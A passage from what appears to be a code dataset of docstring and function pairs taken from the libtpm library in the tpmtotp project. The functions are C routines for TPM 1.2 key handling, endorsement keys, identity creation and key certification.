ERR_MASK) != 0) return ret;\n     /* transmit the request buffer to the TPM device and read the reply */\n     if (allowTransport)\n         ret = TPM_Transmit(&tpmdata, \"EvictKey\");\n     else\n         ret = TPM_Transmit_NoTransport(&tpmdata, \"EvictKey\");\n     if (ret == TPM_BAD_ORDINAL) {\n       ret = TPM_FlushSpecific(keyhandle, TPM_RT_KEY);\n     }\n   } else {\n       ret = TPM_FlushSpecific(keyhandle, TPM_RT_KEY);\n   }\n   return ret;\n}", "path": "libtpm\\keys.c", "repo_name": "mjg59/tpmtotp", "stars": 191, "license": "gpl-2.0", "language": "c", "size": 269}
{"docstring": "/****************************************************************************/\n/*                                                                          */\n/* Clear the EK and reset the TPM to default state                          */\n/*                                                                          */\n/* The arguments are ...                                                    */\n/*                                                                          */\n/* inputekreset A pointer to a hash that is used as ekreset                 */\n/*              It must match the parameter passed to CreateRevocableEK     */\n/****************************************************************************/\n", "func_signal": "uint32_t TPM_RevokeTrust(unsigned char *ekreset)", "code": "{\n\tSTACK_TPM_BUFFER( tpmdata)\n\tuint32_t ordinal_no;\n\tuint32_t ret;\n\t\n\t/* check input arguments */\n\tif (NULL == ekreset) return ERR_NULL_ARG;\n\n\n\t/* move Network byte order data to variable for hmac calculation */\n\tordinal_no = htonl(TPM_ORD_RevokeTrust);\n\n\t/* build the request buffer */\n\tret = TSS_buildbuff(\"00 c1 T l %\", &tpmdata,\n\t                             ordinal_no,\n\t                               TPM_NONCE_SIZE,ekreset);\n\n\t/* transmit the request buffer to the TPM device and read the reply */\n\tret = TPM_Transmit(&tpmdata,\"RevokeTrust\");\n\t\n\treturn ret;\n}", "path": "libtpm\\keys.c", "repo_name": "mjg59/tpmtotp", "stars": 191, "license": "gpl-2.0", "language": "c", "size": 269}
{"docstring": "/* keyhandle is the handle of the key to be read                            */\n/*           0x40000000 for the SRK                                         */\n/* keyauth   is the authorization data (password) for the key               */\n/*           if null, it is assumed that the key requires no authorization  */\n/* keyblob   is a pointer to an area which will receive a copy of the       */\n/*           public key blob.                                               */\n/* keyblen   is a pointer to an integer which will receive the length of    */\n/*           the key blob                                                   */\n/*                                                                          */\n/****************************************************************************/\n", "func_signal": "static uint32_t TPM_GetPubKey_Internal(uint32_t keyhandle,\n                                       unsigned char *keyauth,\n                                       pubkeydata *pk)", "code": "{\n   uint32_t ret;\n   STACK_TPM_BUFFER(tpmdata)\n   unsigned char nonceodd[TPM_NONCE_SIZE];\n   unsigned char pubauth[TPM_HASH_SIZE];\n   unsigned char c = 0;\n   uint32_t ordinal = htonl(0x21);\n   uint32_t keyhndl = htonl(keyhandle);\n   int      size;\n   \n   /* check input arguments */\n   if (pk == NULL) return ERR_NULL_ARG;\n   if (keyauth != NULL) /* key requires authorization */\n      {\n      session sess;\n      /* generate odd nonce */\n      TSS_gennonce(nonceodd);\n      /* Open OIAP Session */\n      ret = TSS_SessionOpen(SESSION_OSAP|SESSION_OIAP|SESSION_DSAP,\n                            &sess,\n                            keyauth, TPM_ET_KEYHANDLE, keyhandle);\n      if (ret != 0) return ret;\n\n      /* calculate authorization HMAC value */\n      ret = TSS_authhmac(pubauth,TSS_Session_GetAuth(&sess),TPM_HASH_SIZE,TSS_Session_GetENonce(&sess),nonceodd,c,\n                         TPM_U32_SIZE,&ordinal,\n                         0,0);\n      if (ret != 0)\n         {\n         TSS_SessionClose(&sess);\n         return ret;\n         }\n      /* build the request buffer */\n      ret = TSS_buildbuff(\"00 c2 T l l L % o %\",&tpmdata,\n                      ordinal,\n                      keyhndl,\n                      TSS_Session_GetHandle(&sess),\n                      TPM_NONCE_SIZE,nonceodd,\n                      c,\n                      TPM_HASH_SIZE,pubauth);\n      if ((ret & ERR_MASK) != 0)\n         {\n         TSS_SessionClose(&sess);\n         return ret;\n         }\n      /* transmit the request buffer to the TPM device and read the reply */\n      ret = TPM_Transmit(&tpmdata,\"GetPubKey - AUTH1\");\n      TSS_SessionClose(&sess);\n      if (ret != 0)\n         {\n         return ret;\n         }\n      ret = TSS_PubKeyExtract(&tpmdata, TPM_DATA_OFFSET, pk);\n      if ((ret & ERR_MASK)) \n          return ret;\n      size = ret;\n      ret = TSS_checkhmac1(&tpmdata,ordinal,nonceodd,TSS_Session_GetAuth(&sess),TPM_HASH_SIZE,\n                           size,TPM_DATA_OFFSET,\n                           0,0);\n      if (ret != 0) return ret;\n   } else /* key requires NO authorization */ {\n      /* build the request buffer */\n      ret = TSS_buildbuff(\"00 c1 T l l\",&tpmdata,\n                      ordinal,\n                      keyhndl);\n      if ((ret & ERR_MASK) != 0) return ret;\n      /* transmit the request buffer to the TPM device and read the reply */\n      ret = TPM_Transmit(&tpmdata,\"GetPubKey - NO AUTH\");\n      if (ret != 0) return ret;\n      ret = TSS_PubKeyExtract(&tpmdata, TPM_DATA_OFFSET, pk);\n      if ((ret & ERR_MASK))\n          return ret;\n      }\n   return 0;\n   }\n\n\nuint32_t TPM_GetPubKey_UseRoom(uint32_t keyhandle,\n                               unsigned char *keyauth,\n                               pubkeydata *pk)\n{\n    uint32_t ret;\n    uint32_t replaced_keyhandle;\n\n    /* swap in keyhandle */\n    ret = needKeysRoom_Stacked(keyhandle, &replaced_keyhandle);\n    if (ret != 0)\n        return ret;\n\n    ret = TPM_GetPubKey_Internal(keyhandle, keyauth, pk);\n\n    needKeysRoom_Stacked_Undo(keyhandle, replaced_keyhandle);\n\n    return ret;\n}", "path": "libtpm\\keys.c", "repo_name": "mjg59/tpmtotp", "stars": 191, "license": "gpl-2.0", "language": "c", "size": 269}
{"docstring": "/*           keydata is to be returned                                      */\n/* keyblob   is a pointer to an area which will receive a copy of the       */\n/*           encrypted key blob.  If NULL no copy is returned               */\n/* bloblen   is a pointer to an integer which will receive the length of    */\n/*           the key blob, or NULL if no length is to be returned           */\n/*                                                                          */\n/****************************************************************************/\n", "func_signal": "uint32_t TPM_CreateWrapKey(uint32_t keyhandle,\n                           unsigned char *parauth,\n                           unsigned char *newauth,\n                           unsigned char *migauth,\n                           keydata *keyparms,\n                           keydata *key,\n                           unsigned char *keyblob,\n                           unsigned int  *bloblen)", "code": "{\n\tuint32_t ret;\n\tSTACK_TPM_BUFFER( tpmdata)\n\tSTACK_TPM_BUFFER(kparmbuf)\n\tsession sess;\n\tunsigned char encauth1[TPM_HASH_SIZE];\n\tunsigned char encauth2[TPM_HASH_SIZE];\n\tunsigned char nonceodd[TPM_NONCE_SIZE];\n\tunsigned char pubauth[TPM_HASH_SIZE];\n\tunsigned char dummyauth[TPM_HASH_SIZE];\n\tunsigned char *cparauth;\n\tunsigned char *cnewauth;\n\tunsigned char c = 0;\n\tuint32_t ordinal = htonl(TPM_ORD_CreateWrapKey);\n\tuint32_t keyhndl = htonl(keyhandle);\n\tuint16_t keytype;\n\tint      kparmbufsize;\n\tSTACK_TPM_BUFFER(response);\n\n\tmemset(dummyauth,0,sizeof dummyauth);\n\t/* check input arguments */\n\tif (keyparms == NULL) return ERR_NULL_ARG;\n\tif (parauth == NULL) cparauth = dummyauth;\n\telse                 cparauth = parauth;\n\tif (newauth == NULL) cnewauth = dummyauth;\n\telse                 cnewauth = newauth;\n\tif (keyhandle == 0x40000000) keytype = 0x0004;\n\telse                         keytype = 0x0001;\n\t\n\tret = needKeysRoom(keyhandle, 0, 0, 0);\n\tif (ret != 0) {\n\t\treturn ret;\n\t}\n\t\n\tif (keyparms->v.tag != TPM_TAG_KEY12) {\n\t\t/* get the TPM version and put into the keyparms structure */\n\t\tret = TPM_GetCapability(TPM_CAP_VERSION,\n\t\t                        NULL,\n\t\t                        &response);\n\t\tif (ret != 0)\n\t\t\treturn ret;\n\t\tmemcpy(&(keyparms->v.ver), response.buffer, response.used);\n\t}\n\n\t/* generate odd nonce */\n\tTSS_gennonce(nonceodd);\n\n\t/* Open OSAP Session */\n\tret = TSS_SessionOpen(SESSION_OSAP|SESSION_DSAP,&sess,cparauth,keytype,keyhandle);\n\tif (ret != 0) \n\t\treturn ret;\n\n\tTPM_CreateEncAuth(&sess, cnewauth, encauth1, NULL);\n\t/* calculate encrypted authorization value for migration of new key */\n\tif (migauth != NULL) {\n\t\tTPM_CreateEncAuth(&sess, migauth, encauth2, nonceodd);\n\t} else {\n\t\tmemset(encauth2,0,TPM_HASH_SIZE);\n\t}\n\t/* move Network byte order data to variables for hmac calculation */\n\t/* convert keyparm structure to buffer */\n\tret = TPM_WriteKey(&kparmbuf,keyparms);\n\tif ((ret & ERR_MASK) != 0) {\n\t\tTSS_SessionClose(&sess);\n\t\treturn ret;\n\t}\n\tkparmbufsize = ret;\n\t/* calculate authorization HMAC value */\n\tret = TSS_authhmac(pubauth,TSS_Session_GetAuth(&sess),TPM_HASH_SIZE,TSS_Session_GetENonce(&sess),nonceodd,c,\n\t                   TPM_U32_SIZE,&ordinal,\n\t                   TPM_HASH_SIZE,encauth1,\n\t                   TPM_HASH_SIZE,encauth2,\n\t                   kparmbufsize,kparmbuf.buffer,\n\t                   0,0);\n\tif (ret != 0) {\n\t\tTSS_SessionClose(&sess);\n\t\treturn ret;\n\t}\n\t/* build the request buffer */\n\tret = TSS_buildbuff(\"00 c2 T l l % % % L % o %\",&tpmdata,\n\t                             ordinal,\n\t                               keyhndl,\n\t                                 TPM_HASH_SIZE,encauth1,\n\t                                   TPM_HASH_SIZE,encauth2,\n\t                                     kparmbufsize,kparmbuf.buffer,\n\t                                       TSS_Session_GetHandle(&sess),\n\t                                         TPM_NONCE_SIZE,nonceodd,\n\t                                           c,\n\t                                             TPM_HASH_SIZE,pubauth);\n\tif ((ret & ERR_MASK) != 0) {\n\t\tTSS_SessionClose(&sess);\n\t\treturn ret;\n\t}\n\t/* transmit the request buffer to the TPM device and read the reply */\n\tret = TPM_Transmit(&tpmdata,\"CreateWrapKey - AUTH1\");\n\tTSS_SessionClose(&sess);\n\tif (ret != 0) {\n\t\treturn ret;\n   \t}\n\tkparmbufsize = TSS_KeySize(&tpmdata, TPM_DATA_OFFSET);\n\tret = TSS_checkhmac1(&tpmdata,ordinal,nonceodd,TSS_Session_GetAuth(&sess),TPM_HASH_SIZE,\n\t                     kparmbufsize,TPM_DATA_OFFSET,\n\t                     0,0);\n\tif (ret != 0) \n\t\treturn ret;\n\n\t/* convert the returned key to a structure */\n\tif (key != NULL) \n\t\tTSS_KeyExtract(&tpmdata, TPM_DATA_OFFSET ,key);\n\n\t/* copy the key blob to caller */\n\tif (keyblob != NULL) {\n\t\tmemcpy(keyblob,&tpmdata.buffer[TPM_DATA_OFFSET],kparmbufsize);\n\t\tif (bloblen != NULL) *bloblen = kparmbufsize;\n\t}\n\treturn 0;\n}", "path": "libtpm\\keys.c", "repo_name": "mjg59/tpmtotp", "stars": 191, "license": "gpl-2.0", "language": "c", "size": 269}
{"docstring": "/* encScheme: enc_SCHEME                                                    */\n/* sigScheme: TPM_SS_SASSAPKCS1v15_SHA1                                     */\n/* numprimes: 2                                                             */\n/* keybitlen: 2048                                                          */\n/*                                                                          */\n/* The arguments are ...                                                    */\n/*                                                                          */\n/* pubkeybuff   A pointer to an area that will hold the public key          */\n/* pubkeybuflen is the size of the pubkeybuff as given by the caller and    */\n/*              on returns the number of bytes copied into that buffer      */\n/****************************************************************************/\n", "func_signal": "uint32_t TPM_CreateEndorsementKeyPair(unsigned char * pubkeybuff,\n                                      uint32_t * pubkeybuflen)", "code": "{\n\tunsigned char nonce[TPM_HASH_SIZE];\n\tSTACK_TPM_BUFFER(tpmdata)\n\tkeydata k;\n\tuint32_t ret;\n\tuint32_t ordinal_no = htonl(TPM_ORD_CreateEndorsementKeyPair);\n\tint serkeylen;\n\tSTACK_TPM_BUFFER(serkey)\n\tuint32_t size;\n\n\tmemset(&k, 0x0, sizeof(k));\n\tk.pub.algorithmParms.algorithmID = TPM_ALG_RSA;\n\t/* Should be ignored, but a certain HW TPM requires the correct encScheme */\n\tk.pub.algorithmParms.encScheme = TPM_ES_RSAESOAEP_SHA1_MGF1;\n\tk.pub.algorithmParms.sigScheme = TPM_SS_RSASSAPKCS1v15_SHA1;\n\tk.pub.algorithmParms.u.rsaKeyParms.keyLength = 2048;\n\tk.pub.algorithmParms.u.rsaKeyParms.numPrimes = 2;\n\tk.pub.algorithmParms.u.rsaKeyParms.exponentSize = 0;\n\t\n\tTSS_gennonce(nonce);\n\t\n\tserkeylen = TPM_WriteKeyInfo(&serkey, &k);\n\n\tif (serkeylen < 0) {\n\t\treturn serkeylen;\n\t}\n\n\tret = TSS_buildbuff(\"00 c1 T l % %\",&tpmdata,\n\t                             ordinal_no,\n\t                               TPM_HASH_SIZE, nonce,\n\t                                 serkeylen, serkey.buffer);\n\n\tif ((ret & ERR_MASK)) {\n\t\treturn ret;\n\t}\n\t\n\tret = TPM_Transmit(&tpmdata,\"CreateEndorsementKeyPair\");\n\t\n\tif (0 != ret) {\n\t\treturn ret;\n\t}\n\t\n\tsize = TSS_PubKeySize(&tpmdata, TPM_DATA_OFFSET ,0);\n\tif ((size & ERR_MASK)) \n\t\treturn size;\n\n\t*pubkeybuflen = MIN(*pubkeybuflen, size);\n\n\tif (NULL != pubkeybuff) {\n\t\tmemcpy(pubkeybuff, \n\t\t       &tpmdata.buffer[TPM_DATA_OFFSET], \n\t\t       *pubkeybuflen);\n\t}\n\t\n\t/*\n\t * Verify the checksum...\n\t */\n\t{\n\t\tSHA_CTX sha;\n\t\tunsigned char digest[TPM_DIGEST_SIZE];\n\t\tSHA1_Init(&sha);\n\t\tSHA1_Update(&sha,\n\t\t            &tpmdata.buffer[TPM_DATA_OFFSET],\n\t\t            size);\n\t\tSHA1_Update(&sha,\n\t\t            nonce,\n\t\t            TPM_HASH_SIZE);\n\t\tSHA1_Final(digest,&sha);\n\t\tif (0 != memcmp(digest,\n\t\t                &tpmdata.buffer[TPM_DATA_OFFSET+size],\n\t\t                TPM_DIGEST_SIZE)) {\n\t\t\tret = ERR_CHECKSUM;\n\t\t}\n\t}\n\t\n\treturn ret;\n}", "path": "libtpm\\keys.c", "repo_name": "mjg59/tpmtotp", "stars": 191, "license": "gpl-2.0", "language": "c", "size": 269}
{"docstring": "/****************************************************************************/\n/*                                                                          */\n/* Calculate the size of a Asymmetric Key Blob                              */\n/*                                                                          */\n/****************************************************************************/\n", "func_signal": "int TSS_AsymKeySize(const unsigned char * keybuff)", "code": "{\n\tint offset = sizeof(TPM_ALGORITHM_ID) + sizeof(TPM_ENC_SCHEME);\n\tint size;\n\tsize = LOAD16(keybuff, offset);\n\tsize += sizeof(TPM_ALGORITHM_ID) + sizeof(TPM_ENC_SCHEME) + TPM_U16_SIZE;\n\treturn size;\n}", "path": "libtpm\\keys.c", "repo_name": "mjg59/tpmtotp", "stars": 191, "license": "gpl-2.0", "language": "c", "size": 269}
{"docstring": "/****************************************************************************/\n/*                                                                          */\n/* Read the TPM Endorsement public key                                      */\n/*                                                                          */\n/****************************************************************************/\n", "func_signal": "uint32_t TPM_ReadPubek(pubkeydata *k)", "code": "{\n\tSTACK_TPM_BUFFER(tpmdata)\n\tuint32_t ret;\n\tuint32_t len;\n\tunsigned char antiReplay[TPM_NONCE_SIZE];\n\n\t/* check input argument */\n\tif (k == NULL) \n\t\treturn ERR_NULL_ARG;\n\n\tret = TSS_gennonce(antiReplay);\n\tif (ret == 0) \n\t\treturn ERR_CRYPT_ERR;\n\n\t/* copy Read PubKey request template to buffer */\n\tret = TSS_buildbuff(\"00 c1 T 00 00 00 7c %\",&tpmdata,\n                                                 TPM_HASH_SIZE, antiReplay);\n\tif ((ret & ERR_MASK) != 0) return ret;\n\tret = TPM_Transmit(&tpmdata,\"ReadPubek\");\n\tif (ret) \n\t\treturn ret;\n\tlen = TSS_PubKeyExtract(&tpmdata, TPM_DATA_OFFSET ,k);\n\t\n\t/*\n\t * Verify the checksum...\n\t */\n\t{\n\t\tSHA_CTX sha;\n\t\tunsigned char digest[TPM_DIGEST_SIZE];\n\t\tSHA1_Init(&sha);\n\t\tSHA1_Update(&sha,\n\t\t            &tpmdata.buffer[TPM_DATA_OFFSET],\n\t\t            len);\n\t\tSHA1_Update(&sha,\n\t\t            antiReplay,\n\t\t            TPM_HASH_SIZE);\n\t\tSHA1_Final(digest,&sha);\n\t\tif (0 != memcmp(digest,\n\t\t                &tpmdata.buffer[TPM_DATA_OFFSET+len],\n\t\t                TPM_DIGEST_SIZE)) {\n\t\t\tret = -1;\n\t\t}\n\t}\n\t\n\treturn 0;\n}", "path": "libtpm\\keys.c", "repo_name": "mjg59/tpmtotp", "stars": 191, "license": "gpl-2.0", "language": "c", "size": 269}
{"docstring": "/* ownerAuth     is the authorization data of the owner                     */\n/* idbinding     is a pointer to an area that will receive the signature of */\n/*               TPM_IDENTITY_CONTENTS                                      */\n/* idbindingsize must indicate the size of the idbinding area on input and  */\n/*               will hold the used size in the idbinding area on output    */\n/****************************************************************************/\n", "func_signal": "uint32_t TPM_MakeIdentity(unsigned char * identityauth,\n                          unsigned char * identitylabel,\n                          keydata * keyparms,\n                          keydata * key,\n\t\t\t  unsigned char *keyblob,\n\t\t\t  unsigned int  *keybloblen,\n                          unsigned char * srkAuth,\n                          unsigned char * ownerAuth,\n                          unsigned char * idbinding,\n\t\t\t  uint32_t * idbsize\n                          )", "code": "{\n\tuint32_t ret = 0;\n\tuint32_t ordinal_no = htonl(TPM_ORD_MakeIdentity);\n\tunsigned char c = 0;\n\t(void)idbinding;\n\n\tSTACK_TPM_BUFFER(tpmdata)\n\tSTACK_TPM_BUFFER(ser_key)\n\tunsigned char nonceodd[TPM_NONCE_SIZE];\n\tunsigned char nonceodd2[TPM_NONCE_SIZE];\n\tunsigned char authdata1[TPM_NONCE_SIZE];\n\tunsigned char authdata2[TPM_NONCE_SIZE];\n\tunsigned char encauth1[TPM_NONCE_SIZE];\n\tunsigned char dummy[TPM_HASH_SIZE];\n\tsession sess;\n\t\n\tint      serkeysize;\n\tint      keylen;\n\n\n\tif (NULL == keyparms     ||\n\t    NULL == key          || \n\t    NULL == identitylabel) {\n\t\treturn ERR_NULL_ARG;\n\t}\n\n\tmemset(dummy, 0x0, sizeof(dummy));\n\tif (NULL == identityauth) identityauth = dummy;\n\t/*\n\t * Serialize the key\n\t */\n\tserkeysize = TPM_WriteKey(&ser_key,keyparms);\n\n\tTSS_gennonce(nonceodd);\n\n\tif (NULL != srkAuth) {\n\t\tsession sess0;\n\t\tTSS_gennonce(nonceodd2);\n\t\t\n\t\tret = TSS_SessionOpen(SESSION_OSAP|SESSION_OIAP|SESSION_DSAP,\n\t\t                      &sess0,\n\t\t                      srkAuth, TPM_ET_SRK, 0);\n\t\tif (0 != ret) {\n\t\t\treturn ret;\n\t\t}\n\t\t/*\n\t\t * Open OSAP session\n\t\t */\n\t\tret = TSS_SessionOpen(SESSION_OSAP|SESSION_DSAP,\n\t\t                      &sess,ownerAuth,TPM_ET_OWNER,0);\n\t\tif (0 != ret) {\n\t\t\tTSS_SessionClose(&sess0);\n\t\t\treturn ret;\n\t\t}\n\n\t\t/* Generate the encrypted usage authorization */\n\t\tTPM_CreateEncAuth(&sess, identityauth, encauth1, 0);\n\n\t\tret = TSS_authhmac(authdata1,TSS_Session_GetAuth(&sess0),TPM_HASH_SIZE,TSS_Session_GetENonce(&sess0),nonceodd,c,\n\t\t                   TPM_U32_SIZE, &ordinal_no,\n\t\t                   TPM_HASH_SIZE, encauth1,\n\t\t                   TPM_HASH_SIZE, identitylabel,\n\t\t                   serkeysize, ser_key.buffer,\n\t\t                   0,0);\n\t\tif (0 != ret) {\n\t\t\tTSS_SessionClose(&sess0);\n\t\t\tTSS_SessionClose(&sess);\n\t\t\treturn ret;\n\t\t}\n\t\tret = TSS_authhmac(authdata2,TSS_Session_GetAuth(&sess),TPM_HASH_SIZE,TSS_Session_GetENonce(&sess),nonceodd2,c,\n\t\t                   TPM_U32_SIZE, &ordinal_no,\n\t\t                   TPM_HASH_SIZE, encauth1,\n\t\t                   TPM_HASH_SIZE, identitylabel,\n\t\t                   serkeysize, ser_key.buffer,\n\t\t                   0,0);\n\t\tif (0 != ret) {\n\t\t\tTSS_SessionClose(&sess0);\n\t\t\tTSS_SessionClose(&sess);\n\t\t\treturn ret;\n\t\t}\n\n\t\tret = TSS_buildbuff(\"00 c3 T l % % % L % o % L % o %\", &tpmdata,\n\t\t                             ordinal_no,\n\t\t                               TPM_HASH_SIZE, encauth1,\n\t\t                                 TPM_HASH_SIZE, identitylabel,\n\t\t                                   serkeysize, ser_key.buffer,\n\t\t                                     TSS_Session_GetHandle(&sess0),\n\t\t                                       TPM_NONCE_SIZE,nonceodd,\n\t\t                                         c,\n\t\t                                           TPM_HASH_SIZE, authdata1,\n\t\t                                             TSS_Session_GetHandle(&sess),\n\t\t                                               TPM_NONCE_SIZE,nonceodd2,\n\t\t                                                 c,\n\t\t                                                   TPM_HASH_SIZE,authdata2);\n\n\t\tif (0 != (ret & ERR_MASK)) {\n\t\t\tTSS_SessionClose(&sess0);\n\t\t\tTSS_SessionClose(&sess);\n\t\t\treturn ret;\n\t\t}\n\t\t\n\t\tret = TPM_Transmit(&tpmdata,\"MakeIdentity - AUTH2\");\n\n\t\tTSS_SessionClose(&sess0);\n\t\tTSS_SessionClose(&sess);\n\t\tif (0 != ret) {\n\t\t\treturn ret;\n\t\t}\n\t\t\n\t\t/*\n\t\t * Have to deserialize the key\n\t\t */\n\t\tkeylen = TSS_KeyExtract(&tpmdata,\n\t\t\t\t\tTPM_DATA_OFFSET,\n\t\t\t\t\tkey);\n\t\tret = tpm_buffer_load32(&tpmdata, \n\t\t                        TPM_DATA_OFFSET + keylen,\n\t\t                        idbsize);\n\t\tif ((ret & ERR_MASK)) {\n\t\t\treturn ret;\n\t\t}\n\t\tret = TSS_checkhmac2(&tpmdata,ordinal_no,nonceodd,\n\t\t                     TSS_Session_GetAuth(&sess0), TPM_HASH_SIZE,\n\t\t                     nonceodd2,\n\t\t                     TSS_Session_GetAuth(&sess) , TPM_HASH_SIZE,\n\t\t                     keylen,       TPM_DATA_OFFSET,\n\t\t                     TPM_U32_SIZE, TPM_DATA_OFFSET+keylen,\n\t\t                     *idbsize,     TPM_DATA_OFFSET+keylen+TPM_U32_SIZE,\n\t\t                     0,0);\n\n\t} else {\n\t\tret = TSS_SessionOpen(SESSION_OSAP|SESSION_DSAP,&sess,ownerAuth,TPM_ET_OWNER,0);\n\t\tif (0 != ret) {\n\t\t\treturn ret;\n\t\t}\n\n\t\t/* Generate the encrypted usage authorization */\n\t\tTPM_CreateEncAuth(&sess, identityauth ,encauth1, 0);\n\n\t\tret = TSS_authhmac(authdata1,TSS_Session_GetAuth(&sess),TPM_HASH_SIZE,TSS_Session_GetENonce(&sess),nonceodd,c,\n\t\t                TPM_U32_SIZE, &ordinal_no,\n\t\t                TPM_HASH_SIZE, encauth1,\n\t\t                TPM_HASH_SIZE, identitylabel,\n\t\t                serkeysize, ser_key.buffer,\n\t\t                0,0);\n\t\tif (0 != ret) {\n\t\t\tTSS_SessionClose(&sess);\n\t\t\treturn ret;\n\t\t}\n\t\t\n\t\t\n\t\tret = TSS_buildbuff(\"00 c2 T l % % % L % o %\", &tpmdata,\n\t\t                             ordinal_no,\n\t\t                               TPM_HASH_SIZE, encauth1,\n\t\t                                 TPM_HASH_SIZE, identitylabel,\n\t\t                                   serkeysize, ser_key.buffer,\n\t\t                                     TSS_Session_GetHandle(&sess),\n\t\t                                       TPM_NONCE_SIZE,nonceodd,\n\t\t                                         c,\n\t\t                                           TPM_HASH_SIZE, authdata1);\n\n\t\tif ((ret & ERR_MASK)) {\n\t\t\tTSS_SessionClose(&sess);\n\t\t\treturn ret;\n\t\t}\n\t\t\n\t\tret = TPM_Transmit(&tpmdata,\"MakeIdentity - AUTH1\");\n\t\tTSS_SessionClose(&sess);\n\n\t\tif (0 != ret) {\n\t\t\treturn ret;\n\t\t}\n\t\t\n\t\t/*\n\t\t * Have to deserialize the key\n\t\t */\n\t\tkeylen = TSS_KeyExtract(&tpmdata,\n\t\t\t\t\tTPM_DATA_OFFSET,\n\t\t\t\t\tkey);\n\t\tret = tpm_buffer_load32(&tpmdata,\n\t\t\t\t\tTPM_DATA_OFFSET + keylen,\n\t\t\t\t\tidbsize);\n\t\tif ((ret & ERR_MASK)) {\n\t\t\treturn ret;\n\t\t}\n\t\tret = TSS_checkhmac1(&tpmdata,ordinal_no,nonceodd,TSS_Session_GetAuth(&sess),TPM_HASH_SIZE,\n\t\t                     keylen,       TPM_DATA_OFFSET,\n\t\t                     TPM_U32_SIZE, TPM_DATA_OFFSET+keylen,\n\t\t                     *idbsize,     TPM_DATA_OFFSET+keylen+TPM_U32_SIZE,\n\t\t                     0,0);\n\t}\n\t/* extract the identity key blob, return to caller */\n\tif (ret == 0) {\n\t    int len = TSS_KeySize(&tpmdata, TPM_DATA_OFFSET);\n\t    if (keyblob != NULL) {\n\t\tmemcpy(keyblob, &tpmdata.buffer[TPM_DATA_OFFSET], len);\n\t\tif (keybloblen != NULL) {\n\t\t    *keybloblen = len ;\n\t\t}\n\t    }\n\t}\n\treturn ret;\n}", "path": "libtpm\\identity.c", "repo_name": "mjg59/tpmtotp", "stars": 191, "license": "gpl-2.0", "language": "c", "size": 269}
{"docstring": "/****************************************************************************/\n/*                                                                          */\n/* Convert a TPM public key to an OpenSSL RSA public key                    */\n/*                                                                          */\n/****************************************************************************/\n", "func_signal": "RSA *TSS_convpubkey(pubkeydata *k)", "code": "{\n   RSA  *rsa;\n   BIGNUM *mod;\n   BIGNUM *exp;\n   \n   /* create the necessary structures */\n   rsa = RSA_new();\n   mod = BN_new();\n   exp = BN_new();\n   if (rsa == NULL || mod == NULL || exp == NULL) {\n      if (rsa) {\n         RSA_free(rsa);\n      }\n      if (mod) {\n         BN_free(mod);\n      }\n      if (exp) {\n         BN_free(exp);\n      }\n      return NULL;\n   }\n   /* convert the raw public key values to BIGNUMS */\n   BN_bin2bn(k->pubKey.modulus,k->pubKey.keyLength,mod);\n   if (0 == k->algorithmParms.u.rsaKeyParms.exponentSize) {\n      unsigned char exponent[3] = {0x1,0x0,0x1};\n      BN_bin2bn(exponent,3,exp);\n   } else {\n      BN_bin2bn(k->algorithmParms.u.rsaKeyParms.exponent,\n                k->algorithmParms.u.rsaKeyParms.exponentSize,\n                exp);\n   }\n   /* set up the RSA public key structure */\n   rsa->n = mod;\n   rsa->e = exp;\n   return rsa;\n   }\n\n\n/****************************************************************************/\n/*                                                                          */\n/* Get the Fingerprint of a Key given a pubkeydata structure                */\n/*                                                                          */\n/****************************************************************************/\nvoid TSS_pkeyprint(pubkeydata *key, unsigned char *fprint)\n   {\n   TSS_sha1(key->pubKey.modulus,key->pubKey.keyLength,fprint);\n   }\n   \n/****************************************************************************/\n/*                                                                          */\n/* Get the Fingerprint of a Key given a key blob                            */\n/*                                                                          */\n/****************************************************************************/\nvoid TSS_keyprint(unsigned char *keybuff, unsigned char *fprint)\n   {\n   keydata k;\n   STACK_TPM_BUFFER(buffer);\n   SET_TPM_BUFFER(&buffer, keybuff, sizeof(TPM_KEY_EMB));\n   \n   TSS_KeyExtract(&buffer, 0,&k);\n   TSS_pkeyprint(&(k.pub),fprint);\n   }\n   \n/****************************************************************************/\n/*                                                                          */\n/* Get the Fingerprint of a Key given a loaded key handle and authdata      */\n/*                                                                          */\n/****************************************************************************/\nuint32_t TSS_lkeyprint(uint32_t keyhandle, unsigned char *keyauth, unsigned char *fprint)\n   {\n   uint32_t ret;\n   pubkeydata k;\n\n   ret = TPM_GetPubKey(keyhandle, keyauth, &k);\n   if (ret != 0) return ret;\n   TSS_pkeyprint(&k,fprint);\n   return 0;\n   }\n\n\n\n/****************************************************************************/\n/*                                                                          */\n/* Certify a key                                                            */\n/*                                                                          */\n/* The arguments are ...                                                    */\n/*                                                                          */\n/* certhandle   is the handle of the key used to certify they               */\n/* keyhandle    is the handle of the key to be certified                    */\n/* antiReplay   points to a TPM_NONCE_SIZE (20) bytes large buffer          */\n/*              containing an anti replay nonce                             */\n/* certKeyAuth  is a pointer to a password (may be NULL)                    */\n/* usageAuth    is a pointer to a password to inputs and key to be signed   */\n/* certifyInfo  is a pointer to an area that will receive the certifyInfo   */\n/*              blob upon return                                            */\n/* certifyInfoLen  is a pointer to an integer that indicates the size of    */\n/*                 the certifyInfo buffer on input and indicates the number */\n/*                 of valid bytes on output                                 */\n/* outData      is a pointer to a buffer that will receive the signed       */\n/*              public key on return                                        */\n/* outDataSize  is a pointer to an integer that holds the size of the       */\n/*               outData buffer on input and the actual numbers of valid    */\n/*              data used in that buffer on output.                         */\n/****************************************************************************/\nuint32_t TPM_CertifyKey(uint32_t certhandle,\n                        uint32_t keyhandle,\n                        unsigned char *certKeyAuth,\n                        unsigned char *usageAuth,\n                        struct tpm_buffer *certifyInfo_ser,\n                        struct tpm_buffer *signature)\n{\n\tuint32_t ret = 0;\n\tuint32_t ordinal_no = htonl(TPM_ORD_CertifyKey);\n\tunsigned char c = 0;\n\tunsigned char nonceodd[TPM_NONCE_SIZE];\n\tunsigned char authdata1[TPM_NONCE_SIZE];\n\tunsigned char antiReplay[TPM_HASH_SIZE];\n\tSTACK_TPM_BUFFER(tpmdata)\n\tuint32_t certHandle_no = htonl(certhandle);\n\tuint32_t keyHandle_no = htonl(keyhandle);\n\tuint32_t ci_size;\n\tuint32_t len;\n\tsession sess;\n\n\tif (NULL == usageAuth) {\n\t\treturn ERR_NULL_ARG;\n\t}\n\t\n\tret = needKeysRoom(certhandle, keyhandle, 0, 0);\n\tif (ret != 0) {\n\t\treturn ret;\n\t}\n\n\tTSS_gennonce(antiReplay);\n\tTSS_gennonce(nonceodd);\n\t\n\tif (NULL != certKeyAuth) {\n\t\tsession sess2;\n\t\tunsigned char authdata2[TPM_NONCE_SIZE];\n\t\tunsigned char 